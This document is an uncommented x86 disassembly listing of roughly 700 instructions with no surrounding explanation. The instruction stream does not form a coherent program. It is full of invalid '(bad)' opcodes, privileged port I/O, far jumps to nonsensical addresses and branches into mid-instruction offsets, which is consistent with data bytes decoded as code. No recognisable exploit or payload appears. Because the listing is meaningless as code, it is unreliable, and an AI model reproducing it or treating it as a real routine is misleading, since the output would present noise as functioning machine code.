  412119:	addr16 pop esp
  41211b:	lods   eax,DWORD PTR ds:[esi]
  41211c:	cmp    ecx,DWORD PTR [ecx+ebx*2]
  41211f:	nop
  412120:	das    
  412121:	rcr    DWORD PTR [edx+0x5cb3920f],cl
  412127:	test   eax,0x359d2752
  41212c:	aas    
  41212d:	mov    edi,0x879ae415
  412132:	or     eax,0x673abfd5
  412137:	cmp    ah,bh
  412139:	mov    ss,ecx
  41213b:	(bad)  
  41213c:	push   cs
  41213d:	add    edi,ebx
  41213f:	js     0x4120ec
  412141:	dec    esi
  412142:	ret    
  412143:	sub    eax,0xce0e2e71
  412148:	and    edi,DWORD PTR [ebp+0x35]
  41214b:	sti    
  41214c:	add    eax,0x4c9c9ff3
  412151:	jbe    0x412122
  412153:	cmp    al,0xc9
  412155:	das    
  412156:	test   BYTE PTR [edx+0x58],cl
  412159:	and    DWORD PTR [edx-0xf],ebx
  41215c:	xor    eax,0xb3737246
  412161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412162:	inc    ebp
  412163:	or     edx,DWORD PTR [edi]
  412165:	xlat   BYTE PTR ds:[ebx]
  412166:	mov    dl,0x3a
  412168:	adc    dl,dh
  41216a:	bound  edi,QWORD PTR [edx+0x6ebb743d]
  412170:	jl     0x4121d5
  412172:	mov    eax,0x864e104e
  412177:	dec    edi
  412178:	out    0x7,al
  41217a:	xor    cl,ah
  41217c:	jg     0x4121e6
  41217e:	aam    0x17
  412180:	rcr    BYTE PTR ds:0x58e5269,0x83
  412187:	xor    DWORD PTR [edx],ecx
  412189:	xchg   esi,eax
  41218a:	mov    edi,0x67da9a1d
  41218f:	cld    
  412190:	jg     0x4121b6
  412192:	jns    0x412131
  412194:	sub    DWORD PTR [ebx-0x1b],esp
  412197:	adc    edx,edx
  412199:	addr16 adc al,0x8b
  41219c:	adc    al,0xd2
  41219e:	icebp  
  41219f:	js     0x41212a
  4121a1:	or     BYTE PTR [edi+ebx*8],ch
  4121a4:	mov    edi,ecx
  4121a6:	(bad)  
  4121a7:	push   esi
  4121a8:	ret    0x9b18
  4121ab:	cmp    al,0x5d
  4121ad:	cmp    eax,0x34205e5b
  4121b2:	outs   dx,DWORD PTR ds:[esi]
  4121b3:	fist   DWORD PTR [eax-0x16]
  4121b6:	jge    0x412183
  4121b8:	enter  0x59c4,0x4d
  4121bc:	jmp    FWORD PTR [esi+0x5245cef5]
  4121c2:	test   BYTE PTR [eax],ah
  4121c4:	jp     0x412226
  4121c6:	dec    ecx
  4121c7:	in     eax,dx
  4121c8:	imul   esi,DWORD PTR [ebx+0x5db37472],0xffffffa3
  4121cf:	dec    esp
  4121d0:	fnstsw WORD PTR [edi-0x74]
  4121d3:	push   ecx
  4121d4:	cwde   
  4121d5:	and    DWORD PTR [ebp+eiz*1+0x28],0x121ec86b
  4121dd:	inc    ecx
  4121de:	fwait
  4121df:	xlat   BYTE PTR ds:[ebx]
  4121e0:	or     ecx,DWORD PTR [eax-0x7f5c68d4]
  4121e6:	pop    ecx
  4121e7:	and    al,0x77
  4121e9:	ret    
  4121ea:	push   ds
  4121eb:	sbb    ecx,ebx
  4121ed:	adc    BYTE PTR [ebp+0x6b],ah
  4121f0:	xor    eax,0x73f82a73
  4121f5:	inc    ebx
  4121f6:	fdiv   QWORD PTR [ebx+ebx*2-0x4b]
  4121fa:	outs   dx,BYTE PTR ds:[esi]
  4121fb:	xchg   ebx,eax
  4121fc:	add    al,0xbd
  4121fe:	push   ss
  4121ff:	dec    ecx
  412200:	enter  0x4bda,0x44
  412204:	jge    0x412190
  412206:	popa   
  412207:	inc    edi
  412208:	imul   edi,DWORD PTR [edx+0x4a],0x52
  41220c:	ds push ss
  41220e:	jmp    0x4121ff
  412210:	scas   al,BYTE PTR es:[edi]
  412211:	mov    edi,0xf3a98da7
  412216:	cmp    al,0x7a
  412218:	push   0x8bf890d
  41221d:	inc    ebp
  41221e:	mov    bl,0x70
  412220:	js     0x412297
  412222:	in     al,0xa6
  412224:	mov    edx,0x4d30924
  412229:	and    ah,BYTE PTR [eax+0x58]
  41222c:	nop
  41222d:	std    
  41222e:	bound  esp,QWORD PTR [edi+0x38]
  412231:	out    0x53,al
  412233:	xchg   edi,eax
  412234:	dec    edi
  412235:	push   ecx
  412236:	jl     0x412282
  412238:	out    dx,eax
  412239:	xchg   esp,esi
  41223b:	jmp    0xe49b400b
  412240:	retf   
  412241:	imul   edx,esi,0x62f0936
  412247:	jae    0x412242
  412249:	imul   edi,DWORD PTR [ecx+0x6],0x3d
  41224d:	pop    esp
  41224e:	pusha  
  41224f:	jg     0x41224a
  412251:	into   
  412252:	frndint 
  412254:	mov    eax,ds:0x8222de88
  412259:	or     al,bh
  41225b:	mov    bh,0x99
  41225d:	clc    
  41225e:	jmp    0xa0ae:0x707ee27c
  412265:	jge    0x4121e9
  412267:	add    edx,DWORD PTR ds:0x7a752117
  41226d:	push   cs
  41226e:	add    ax,0x6983
  412272:	rcl    eax,cl
  412274:	bnd jl 0x4122ba
  412277:	loopne 0x412201
  412279:	xchg   edx,eax
  41227a:	mov    dh,0x0
  41227c:	add    esi,DWORD PTR [eax]
  41227e:	fnstenv [ecx+0x73]
  412281:	nop
  412282:	leave  
  412283:	test   DWORD PTR [ecx],ebx
  412285:	xchg   ebp,eax
  412286:	ds jbe 0x412290
  412289:	pop    ds
  41228a:	call   0x92f1d5c9
  41228f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  412291:	sti    
  412292:	xchg   esp,eax
  412293:	add    ch,al
  412295:	out    dx,al
  412296:	xor    eax,0xd577a03d
  41229b:	inc    esi
  41229c:	pop    es
  41229d:	mov    al,ds:0x418d4e69
  4122a2:	loopne 0x412303
  4122a4:	lahf   
  4122a5:	jmp    0xdacebf6
  4122aa:	dec    edx
  4122ab:	and    DWORD PTR [edi],ebx
  4122ad:	frstor [edi-0x6b]
  4122b0:	icebp  
  4122b1:	or     al,0x63
  4122b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b4:	dec    esp
  4122b5:	dec    edi
  4122b6:	(bad)  
  4122b7:	jmp    0xedc86166
  4122bc:	dec    edx
  4122bd:	nop
  4122be:	add    DWORD PTR [eax-0x46],ecx
  4122c1:	mov    esp,0x386ef084
  4122c6:	jb     0x412304
  4122c8:	sbb    eax,0xd379b104
  4122cd:	sub    dl,BYTE PTR [ecx+0x3a]
  4122d0:	jge    0x4122bd
  4122d2:	pop    edi
  4122d3:	leave  
  4122d4:	dec    ebp
  4122d5:	xor    eax,0xe4918d8d
  4122da:	stc    
  4122db:	push   esp
  4122dc:	in     eax,0xc7
  4122de:	sub    DWORD PTR [edx],edx
  4122e0:	jge    0x41234f
  4122e2:	inc    ebp
  4122e3:	leave  
  4122e4:	stc    
  4122e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122e6:	neg    BYTE PTR [ecx]
  4122e8:	addr16 dec ebx
  4122ea:	in     al,0xa7
  4122ec:	push   edi
  4122ed:	sbb    al,0xbf
  4122f0:	leave  
  4122f1:	test   al,0x33
  4122f3:	jmp    0x1a703882
  4122f8:	fdiv   DWORD PTR [ecx+0x265702a2]
  4122fe:	loop   0x4122ad
  412300:	sub    DWORD PTR [edx+0x5c2098b2],edx
  412306:	idiv   BYTE PTR [eax]
  412308:	inc    edx
  412309:	in     al,dx
  41230a:	pop    ebp
  41230b:	shl    DWORD PTR [edi-0x757cc5c2],cl
  412311:	ret    0x8f01
  412314:	mov    ch,0xdf
  412316:	xchg   DWORD PTR [edx],esp
  412318:	stos   DWORD PTR es:[edi],eax
  412319:	adc    ebp,0x938d03a6
  41231f:	cmc    
  412320:	jb     0x4122ce
  412322:	int    0xfa
  412324:	lahf   
  412325:	cwde   
  412326:	and    al,BYTE PTR [edi]
  412328:	mov    bh,0xef
  41232a:	jge    0x4122d6
  41232c:	stos   DWORD PTR es:[edi],eax
  41232d:	into   
  41232e:	push   0x6a
  412330:	arpl   WORD PTR [edx],dx
  412332:	test   eax,0x220d1bf9
  412337:	pop    es
  412338:	pop    ds
  412339:	xor    DWORD PTR [edx],ebx
  41233b:	test   DWORD PTR [eax],ecx
  41233d:	fs cdq 
  41233f:	(bad)  
  412340:	push   esi
  412341:	jbe    0x4122da
  412343:	push   0x43
  412345:	sub    bh,BYTE PTR [esi-0x25]
  412348:	mov    edi,0x1927422d
  41234d:	push   esp
  41234e:	stos   DWORD PTR es:[edi],eax
  41234f:	sbb    al,0x58
  412351:	mov    bh,0x97
  412353:	ins    DWORD PTR es:[edi],dx
  412354:	lods   eax,DWORD PTR ds:[esi]
  412355:	mov    dh,0xb2
  412357:	enter  0x4c7b,0x9e
  41235b:	enter  0xde52,0xe9
  41235f:	jns    0x412318
  412361:	sub    BYTE PTR [edi+0x43cc666f],ah
  412367:	test   DWORD PTR es:[ebx],ebx
  41236a:	fsqrt  
  41236c:	outs   dx,DWORD PTR ds:[esi]
  41236d:	add    bl,dh
  41236f:	jecxz  0x412314
  412371:	mov    ds:0x18f736b2,eax
  412376:	mov    dh,0x96
  412378:	bnd ret 
  41237a:	pop    edi
  41237b:	cmp    edx,DWORD PTR [ebp-0x65ddf8c4]
  412381:	test   edx,esp
  412383:	mov    al,ds:0x27eec38b
  412388:	fidivr WORD PTR [ebp+0x289dd45c]
  41238e:	push   es
  41238f:	lahf   
  412390:	enter  0xece4,0xe6
  412394:	and    esi,DWORD PTR [eax+0x71]
  412397:	dec    ebp
  412398:	dec    esi
  412399:	mov    ebp,0xabc29150
  41239e:	jmp    0x4123fe
  4123a0:	dec    edi
  4123a1:	cmp    BYTE PTR [ecx-0xc],al
  4123a4:	rcl    cl,1
  4123a6:	aam    0x7f
  4123a8:	jno    0x412370
  4123aa:	mov    ebp,0x73f4f8fb
  4123af:	sar    DWORD PTR [ebp+0x44],0x89
  4123b3:	inc    ecx
  4123b4:	jge    0x412429
  4123b6:	jge    0x412362
  4123b8:	lahf   
  4123b9:	mov    bl,0xdc
  4123bb:	aaa    
  4123bc:	out    0xd8,eax
  4123be:	push   ds
  4123bf:	fisub  DWORD PTR [ebx+0x6a]
  4123c2:	jno    0x41240e
  4123c4:	sbb    DWORD PTR [esi],eax
  4123c6:	inc    ebp
  4123c7:	daa    
  4123c8:	jecxz  0x412422
  4123ca:	(bad)  
  4123cb:	xchg   esi,eax
  4123cc:	dec    di
  4123ce:	push   ecx
  4123cf:	gs cdq 
  4123d1:	sub    ebx,DWORD PTR ds:0x22e97f2c
  4123d7:	loop   0x41237d
  4123d9:	ins    DWORD PTR es:[edi],dx
  4123da:	adc    BYTE PTR [ecx+0x39],al
  4123dd:	imul   edx,DWORD PTR [ebp-0x213ae484],0xae7a8da3
  4123e7:	sub    BYTE PTR [ebx+0x41],dl
  4123ea:	jge    0x4123cd
  4123ec:	adc    eax,0x65bcb380
  4123f1:	dec    ebx
  4123f2:	pop    ss
  4123f3:	ret    0xce7
  4123f6:	pop    ebp
  4123f7:	gs in  al,dx
  4123f9:	jb     0x4123d8
  4123fb:	dec    ebp
  4123fc:	jge    0x412432
  4123fe:	gs sbb al,0x1f
  412401:	les    edx,FWORD PTR [esi-0xc]
  412404:	lods   eax,DWORD PTR ds:[esi]
  412405:	push   0x2a
  412407:	or     al,0x38
  41240a:	scas   al,BYTE PTR es:[edi]
  41240b:	adc    ecx,ebx
  41240d:	xor    DWORD PTR [esi+edx*4+0x14498e75],0xb
  412415:	shl    DWORD PTR [ebx],cl
  412417:	and    ah,BYTE PTR [edi]
  412419:	sub    BYTE PTR [ebp+eiz*4-0x46],cl
  41241d:	push   0x7295faad
  412422:	das    
  412423:	dec    ebp
  412424:	sbb    BYTE PTR [eax],cl
  412426:	sub    BYTE PTR [ebx+0x5b],bl
  412429:	push   esi
  41242a:	jmp    0x52f31ac6
  41242f:	cmp    eax,0x8acf1bd1
  412434:	mov    dh,BYTE PTR [eax]
  412436:	dec    eax
  412437:	sub    ebp,DWORD PTR [eax-0x37]
  41243a:	xchg   ecx,eax
  41243b:	retf   0x5597
  41243e:	cmovne ebx,eax
  412441:	sbb    BYTE PTR [eax],cl
  412443:	dec    esi
  412444:	mov    edx,0x1d2cb477
  412449:	aaa    
  41244a:	mov    esp,0xdebccf1a
  41244f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412450:	int3   
  412451:	cmp    al,0x4c
  412453:	and    BYTE PTR [esi-0x3f],bl
  412456:	jg     0x412487
  412458:	push   eax
  412459:	test   DWORD PTR [edi+0x67e8e44e],esi
  41245f:	stos   DWORD PTR es:[edi],eax
  412460:	in     eax,0xd
  412462:	mov    edi,0x5f02fd78
  412467:	adc    al,al
  412469:	jl     0x4123ef
  41246b:	adc    BYTE PTR [ecx-0xeff2874],al
  412471:	mov    eax,0xd745cfc1
  412476:	pushf  
  412477:	jmp    0x4124b7
  412479:	fbld   TBYTE PTR [esi]
  41247b:	loope  0x4124f3
  41247d:	out    0xc,eax
  41247f:	jns    0x4124eb
  412481:	fnstenv [eax+0x463be531]
  412487:	mov    bh,BYTE PTR [esi]
  412489:	out    dx,eax
  41248a:	mov    dl,0x2c
  41248c:	xor    al,0x2c
  41248e:	pop    esp
  41248f:	sub    bh,dl
  412491:	pop    es
  412492:	nop
  412493:	mov    bl,0x60
  412495:	fnstenv ds:0x44ace81
  41249b:	mov    ebx,0x9ae21d11
  4124a0:	or     al,0xca
  4124a2:	cmp    DWORD PTR [ebx],ebp
  4124a4:	jl     0x4124d7
  4124a6:	add    ecx,edi
  4124a8:	sub    eax,0xd797c85d
  4124ad:	aas    
  4124ae:	mov    ebx,0xd3cf5fd9
  4124b3:	lods   eax,DWORD PTR ds:[esi]
  4124b4:	xor    edx,esp
  4124b6:	fidiv  WORD PTR [ecx+0xe]
  4124b9:	(bad)  
  4124ba:	sub    bh,BYTE PTR [esi-0x50]
  4124bd:	push   0xf73e63b1
  4124c2:	aam    0x5e
  4124c4:	fcmovu st,st(4)
  4124c6:	retf   
  4124c7:	xchg   esi,eax
  4124c8:	out    dx,al
  4124c9:	shl    BYTE PTR [ecx+0x22],cl
  4124cc:	ds pusha 
  4124ce:	sub    al,0x3a
  4124d0:	std    
  4124d1:	call   0xfbe6ce0e
  4124d6:	sub    eax,0xcace5878
  4124db:	push   ss
  4124dc:	(bad)  
  4124dd:	loop   0x412551
  4124df:	mov    ds:0x3dedb80a,al
  4124e4:	bnd jo 0x41252e
  4124e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124e8:	push   ecx
  4124e9:	xchg   ebp,eax
  4124ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124eb:	daa    
  4124ec:	pop    ebx
  4124ed:	mov    WORD PTR [ecx],gs
  4124ef:	adc    BYTE PTR [esi-0x17],0x79
  4124f3:	jmp    0x4124c0
  4124f5:	out    0x24,eax
  4124f7:	inc    eax
  4124f8:	imul   ecx,DWORD PTR [ebx+0x57],0x6c
  4124fc:	push   eax
  4124fd:	xor    BYTE PTR [ecx+0x5c],0x64
  412501:	jmp    0xa28df04b
  412506:	icebp  
  412507:	jmp    0x5111770f
  41250c:	mov    esp,0x3168ce80
  412511:	mov    ebx,DWORD PTR [edi]
  412513:	ds pop ds
  412515:	inc    eax
  412516:	sub    DWORD PTR [eax+ebp*4-0x3365d6a7],esp
  41251d:	jnp    0x41258d
  41251f:	add    eax,0x14430a52
  412524:	xor    eax,0x7f301491
  412529:	mov    esi,0x486e42ef
  41252e:	mov    esi,0xc02be15d
  412533:	dec    esi
  412534:	pop    ebp
  412535:	aam    0x83
  412537:	cli    
  412538:	rcl    dh,0x6e
  41253b:	sti    
  41253c:	iret   
  41253d:	add    ecx,DWORD PTR [eax-0x2]
  412540:	pop    edi
  412541:	sbb    al,0xbf
  412543:	jmp    0x49ac:0x68592dce
  41254a:	lea    edi,ss:[ecx+ecx*1]
  41254e:	or     BYTE PTR [edx],0xe9
  412551:	xchg   ebp,eax
  412552:	inc    esi
  412553:	xor    DWORD PTR [esi-0x6d],ecx
  412556:	fwait
  412557:	cmp    DWORD PTR [ebx-0x7e5a5e58],ebp
  41255d:	sub    ebx,eax
  41255f:	xor    DWORD PTR [eax-0x504c4936],0x11
  412566:	fwait
  412567:	mov    ebp,0x8f12709d
  41256c:	sbb    BYTE PTR [esp+ecx*2+0x12bb7aed],dh
  412573:	div    BYTE PTR [ecx+0x55]
  412576:	aad    0x89
  412578:	push   edi
  412579:	pushf  
  41257a:	add    edx,edx
  41257c:	cmp    BYTE PTR [ecx+eax*4+0x73],cl
  412580:	hlt    
  412581:	cdq    
  412582:	(bad)  
  412583:	fidiv  DWORD PTR [esi+0x36]
  412586:	pop    ebx
  412587:	mov    edi,0xb77bb75a
  41258c:	loope  0x41258b
  41258e:	add    BYTE PTR [ebp+0x6b],dh
  412591:	sub    eax,0x17a8b9b7
  412596:	mov    WORD PTR [eax],fs
  412598:	mov    ah,0x51
  41259a:	jns    0x4125df
  41259c:	fcom   st(7)
  41259e:	iret   
  41259f:	inc    edi
  4125a0:	mov    esi,0xc9483b77
  4125a5:	pop    esp
  4125a6:	ror    ah,0x44
  4125a9:	adc    BYTE PTR [edi-0x31],bl
  4125ac:	loopne 0x4125fa
  4125ae:	adc    al,0xd0
  4125b0:	xchg   ebp,eax
  4125b1:	in     eax,0xf6
  4125b3:	rol    BYTE PTR [edx+eax*2-0x1c708a06],0x5a
  4125bb:	in     al,dx
  4125bc:	ds cmc 
  4125be:	pop    esp
  4125bf:	inc    ebx
  4125c0:	fcom   DWORD PTR cs:[edx]
  4125c3:	leave  
  4125c4:	icebp  
  4125c5:	push   edi
  4125c7:	jnp    0x412579
  4125c9:	mov    cl,0xb6
  4125cb:	xchg   ebx,eax
  4125cc:	pop    esi
  4125cd:	loop   0x4125fb
  4125cf:	dec    esp
  4125d0:	enter  0xb760,0x99
  4125d4:	jne    0x4125bf
  4125d6:	enter  0x7ffa,0x5
  4125da:	cld    
  4125db:	dec    ebp
  4125dc:	xchg   esi,eax
  4125dd:	std    
  4125de:	push   ebp
  4125df:	(bad)  
  4125e1:	ret    
  4125e2:	loopne 0x4125af
  4125e4:	shl    ecx,cl
  4125e6:	icebp  
  4125e7:	test   eax,0x168dec48
  4125ec:	mov    ah,0x4f
  4125ee:	inc    edx
  4125ef:	jbe    0x41259b
  4125f1:	mov    ah,0x87
  4125f3:	imul   esi,edx,0xffffff97
  4125f6:	jbe    0x412657
  4125f8:	fs push eax
  4125fa:	cld    
  4125fb:	push   0x3b268a2
  412600:	sub    ecx,esp
  412602:	xchg   ebx,eax
  412603:	ret    
  412604:	(bad)  
  412605:	scas   eax,DWORD PTR es:[edi]
  412606:	add    DWORD PTR [ebp+0x2794f954],esi
  41260c:	adc    esp,DWORD PTR [eax]
  41260e:	fnstsw WORD PTR [edx+0x834b190]
  412614:	aam    0x3e
  412616:	jecxz  0x412643
  412618:	das    
  412619:	inc    ecx
  41261a:	ret    
  41261b:	ss (bad) 
  41261d:	arpl   WORD PTR [eax-0x6bffa7d0],dx
  412623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412624:	icebp  
  412625:	mov    ds:0xf78a6ef2,eax
  41262a:	mov    ds:0x60ae5a34,eax
  41262f:	xor    eax,eax
  412631:	jnp    0x4125cd
  412633:	repnz mov eax,ds:0xdc95db8
  412639:	sub    BYTE PTR [ecx],0xa3
  41263c:	cs pop ss
  41263e:	out    dx,eax
  41263f:	sbb    eax,0xd3317bd1
  412644:	and    edi,DWORD PTR [eax+esi*1-0x3d]
  412648:	xchg   esp,eax
  412649:	add    al,bl
  41264b:	shl    BYTE PTR [esi],cl
  41264d:	adc    DWORD PTR [ecx-0x79],esi
  412650:	fwait
  412651:	sbb    BYTE PTR [esi+esi*2+0x59],ah
  412655:	ror    BYTE PTR [ecx],1
  412657:	mov    bh,0x6b
  412659:	or     ebx,edx
  41265b:	hlt    
  41265c:	std    
  41265d:	mov    esp,0x9e95df0b
  412662:	jns    0x41261b
  412664:	not    BYTE PTR [ebx-0x3a01dd3e]
  41266a:	ret    0x98dd
  41266d:	ja     0x4126ba
  41266f:	cmp    BYTE PTR [ebp+0x36],bl
  412672:	add    al,0x1a
  412674:	ucomiss xmm4,DWORD PTR [ebp-0xd]
  412678:	faddp  st(1),st
  41267a:	xor    bl,BYTE PTR [ebx-0x53f3dc95]
  412680:	fsubrp st(0),st
  412682:	pop    esp
  412683:	jns    0x4126c1
  412685:	sti    
  412686:	xchg   ebx,eax
  412687:	out    0x1b,al
  412689:	sbb    DWORD PTR [eax-0x55],0x9
  41268d:	pusha  
  41268e:	in     al,0x76
  412690:	add    cl,bh
  412692:	int    0xa0
  412694:	pop    ebp
  412695:	ins    BYTE PTR es:[edi],dx
  412696:	pop    esp
  412697:	dec    eax
  412698:	stc    
  412699:	leave  
  41269a:	lods   al,BYTE PTR ds:[esi]
  41269b:	cmc    
  41269c:	cdq    
  41269d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41269e:	xchg   ebx,eax
  41269f:	sbb    ebp,ecx
  4126a1:	lds    ebp,FWORD PTR es:[ebx-0x29]
  4126a5:	sub    al,0x4a
  4126a7:	ins    BYTE PTR es:[edi],dx
  4126a8:	mov    ebx,0xe0a10537
  4126ad:	retf   
  4126ae:	ror    BYTE PTR [ebx],0xc6
  4126b1:	data16 mov al,ds:0x62dacc2f
  4126b7:	push   edi
  4126b8:	(bad)  
  4126b9:	adc    cl,dl
  4126bb:	cmp    eax,0xe6940f65
  4126c0:	test   al,0xbe
  4126c2:	lds    esi,FWORD PTR [esp+ecx*4-0x51]
  4126c6:	pop    esi
  4126c7:	xchg   ebp,eax
  4126c8:	call   0xa6d0:0x3eb4ff3c
  4126cf:	and    edi,DWORD PTR [ebp+0x20]
  4126d2:	ret    
  4126d3:	inc    esp
  4126d4:	nop
  4126d5:	ret    
  4126d6:	cld    
  4126d7:	push   0xa409b79f
  4126dc:	xchg   ebx,eax
  4126dd:	mov    BYTE PTR [esi],cl
  4126df:	sub    ecx,edx
  4126e1:	imul   ebp,DWORD PTR [ebx],0xffffffc7
  4126e4:	mov    bl,BYTE PTR [ecx-0x67]
  4126e7:	pop    eax
  4126e8:	pop    ss
  4126e9:	lods   al,BYTE PTR ds:[esi]
  4126ea:	mov    cl,BYTE PTR [esi+edx*4-0x38]
  4126ee:	in     al,0xe4
  4126f0:	cmp    esp,DWORD PTR ds:0xc98977a7
  4126f6:	aas    
  4126f7:	mov    bl,BYTE PTR [edx]
  4126f9:	inc    ecx
  4126fa:	(bad)  
  4126fb:	in     eax,0x13
  4126fd:	int3   
  4126fe:	popa   
  4126ff:	daa    
  412700:	scas   eax,DWORD PTR es:[edi]
  412701:	jns    0x4126c9
  412703:	inc    ecx
  412704:	aaa    
  412705:	or     al,BYTE PTR [esi+0x347d56ac]
  41270b:	adc    ah,BYTE PTR [edi+0x691ab8ad]
  412711:	loop   0x412743
  412713:	xchg   BYTE PTR [edx],dl
  412715:	pop    ebp
  412716:	retf   
  412717:	pop    es
  412718:	sub    eax,0x92969a69
  41271d:	adc    bl,BYTE PTR [eax-0x6cdccf72]
  412723:	lock jmp 0xd9ec:0x8ff51a41
  41272b:	inc    ecx
  41272c:	sbb    eax,0xff30d08d
  412731:	dec    ebx
  412732:	stos   DWORD PTR es:[edi],eax
  412733:	fs mov dh,0xfe
  412736:	lds    esp,FWORD PTR [ebp-0x80]
  412739:	adc    edx,DWORD PTR [eax-0x17]
  41273c:	fisttp WORD PTR [ebp+0x4282ef9d]
  412742:	mov    fs,esi
  412744:	and    eax,0x24f0685e
  412749:	loope  0x4127b4
  41274b:	push   esp
  41274c:	call   0x76f30867
  412751:	enter  0xc9d8,0x86
  412755:	push   ebp
  412756:	cdq    
  412757:	out    dx,al
  412758:	mov    al,BYTE PTR [esi+ecx*1-0x6e]
  41275c:	mov    ds:0x3819e216,al
  412761:	add    eax,0xb4ba4513
  412766:	push   ecx
  412767:	sub    ebx,DWORD PTR [edi+0x541da9e4]
  41276d:	aas    
  41276e:	test   ah,dl
  412770:	js     0x4127ae
  412772:	mov    bl,0x6a
  412774:	jmp    0x8ed61e8c
  412779:	xlat   BYTE PTR ds:[ebx]
  41277a:	adc    al,0x10
  41277c:	pop    esi
  41277d:	jp     0x41277a
  41277f:	xor    al,BYTE PTR [eax+0x538936f0]
  412785:	inc    esp
  412786:	jmp    0x41273c
  412788:	loope  0x412805
  41278a:	mov    ds,ecx
  41278c:	mov    al,0x40
  41278e:	xchg   ebx,eax
  41278f:	jge    0x4127d3
  412791:	or     BYTE PTR [ebp-0x15],cl
  412794:	into   
  412795:	adc    esp,DWORD PTR [edi-0x1]
  412798:	fiadd  WORD PTR [edx]
  41279a:	mov    al,ds:0x2340ef6d
  41279f:	lds    edx,FWORD PTR ds:0xad627eeb
  4127a5:	stc    
  4127a6:	cli    
  4127a7:	loopne 0x4127db
  4127a9:	ja     0x412770
  4127ab:	add    BYTE PTR [esi-0x691c4cdd],0x5b
  4127b2:	xchg   ecx,eax
  4127b3:	out    0xa7,eax
  4127b5:	rcr    BYTE PTR [eax-0x27e2e948],cl
  4127bb:	fnstenv [ecx]
  4127bd:	add    BYTE PTR [edx+0x650e3d1b],0x2f
  4127c4:	addr16 inc ebx
  4127c6:	addr16 inc ecx
  4127c8:	lods   eax,DWORD PTR ds:[esi]
  4127c9:	xchg   ebx,eax
  4127ca:	mov    dl,0x35
  4127cc:	iret   
  4127cd:	aas    
  4127ce:	pop    ecx
  4127cf:	push   ss
  4127d0:	push   esp
  4127d1:	push   0xf0df6fb4
  4127d6:	pop    ss
  4127d7:	jb     0x412841
  4127d9:	gs je  0x4127f0
  4127dc:	dec    ecx
  4127dd:	push   0xffffff97
  4127df:	adc    ecx,esi
  4127e1:	arpl   bp,bx
  4127e3:	sub    ebx,DWORD PTR [esi+0x57]
  4127e6:	daa    
  4127e7:	and    DWORD PTR [ebp-0x6c4bf46d],esi
  4127ed:	imul   edx,edi,0x39
  4127f0:	pop    ebx
  4127f1:	aam    0x41
  4127f3:	test   al,0xf1
  4127f5:	mov    esp,0x9d9fe6f0
  4127fa:	mov    eax,ds:0x9d50b4c8
  4127ff:	aas    
  412800:	nop
  412801:	pusha  
  412802:	out    dx,eax
  412803:	std    
  412804:	xor    eax,ecx
  412806:	loopne 0x412815
  412808:	shr    DWORD PTR [edi],1
  41280a:	pop    esp
  41280b:	int3   
  41280c:	push   ebx
  41280d:	mov    al,0xcb
  41280f:	fld    QWORD PTR [eax+ebp*8-0x5e01778c]
  412816:	(bad)  
  412817:	sbb    edi,esi
  412819:	sbb    DWORD PTR [esi],edx
  41281b:	sbb    eax,0x6b25dd2
  412820:	ja     0x4127b1
  412822:	mov    esi,?
  412824:	clc    
  412825:	lea    ecx,[ecx-0xc]
  412828:	cmp    al,0x52
  41282a:	cmp    eax,0xcedd805e
  41282f:	xor    ebp,esp
  412831:	sub    DWORD PTR [esi],0x79
  412834:	lock inc esp
  412836:	loop   0x4128b1
  412838:	pop    ebx
  412839:	pusha  
  41283a:	jecxz  0x412822
  41283c:	push   esi
  41283d:	popa   
  41283e:	call   DWORD PTR [edx-0x7cfcc158]
  412844:	dec    ebx
  412845:	js     0x41280a
  412847:	adc    edi,DWORD PTR [ebx+ecx*1+0x17]
  41284b:	lds    edx,FWORD PTR [eax+eax*2+0x31]
  41284f:	adc    eax,0xb88e0519
  412854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412855:	mov    dh,0xb4
  412857:	and    al,BYTE PTR [eax]
  412859:	lods   eax,DWORD PTR ds:[esi]
  41285a:	mov    al,ds:0x9843e886
  41285f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412860:	fidivr DWORD PTR [eax]
  412862:	xchg   esi,eax
  412863:	and    edx,DWORD PTR [edx+0x3e]
  412866:	xor    esp,DWORD PTR [edi]
  412868:	jp     0x4128d2
  41286a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41286b:	xor    DWORD PTR [eax-0x1b],0x5a
  41286f:	dec    eax
  412870:	inc    edi
  412871:	push   cs
  412872:	mov    bl,0x15
  412874:	and    bh,BYTE PTR [eax+0x5b]
  412877:	cmp    DWORD PTR [edx+esi*4],0xffffff88
  41287b:	add    bh,0x41
  41287e:	add    al,0x70
  412880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412881:	xor    ah,BYTE PTR ds:0xa767579d
  412887:	fist   DWORD PTR [edi]
  412889:	pop    edx
  41288a:	or     DWORD PTR [ecx+0x666cbf90],edx
  412890:	jbe    0x4128ec
  412892:	and    eax,DWORD PTR [edi]
  412894:	test   DWORD PTR [edx],ecx
  412896:	push   edi
  412897:	shr    bl,1
  412899:	add    BYTE PTR [ecx+edi*2-0x30],bh
  41289d:	add    DWORD PTR [esi+0x608d8cd4],eax
  4128a3:	pop    ds
  4128a4:	retf   0x1f00
  4128a7:	ss scas eax,DWORD PTR es:[edi]
  4128a9:	inc    ecx
  4128aa:	push   ss
  4128ab:	dec    ebx
  4128ac:	xchg   esp,eax
  4128ad:	in     al,dx
  4128ae:	xor    al,0xa8
  4128b0:	add    bl,cl
  4128b2:	loope  0x4128af
  4128b4:	pop    esi
  4128b5:	aas    
  4128b6:	xchg   DWORD PTR [ecx],esi
  4128b8:	or     cl,bl
  4128ba:	sbb    BYTE PTR [esi-0x17],bh
  4128bd:	or     al,0x44
  4128bf:	out    0x97,al
  4128c1:	aaa    
  4128c2:	out    dx,eax
  4128c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c5:	iret   
  4128c6:	adc    ch,BYTE PTR [ebx-0x2cb2e7b9]
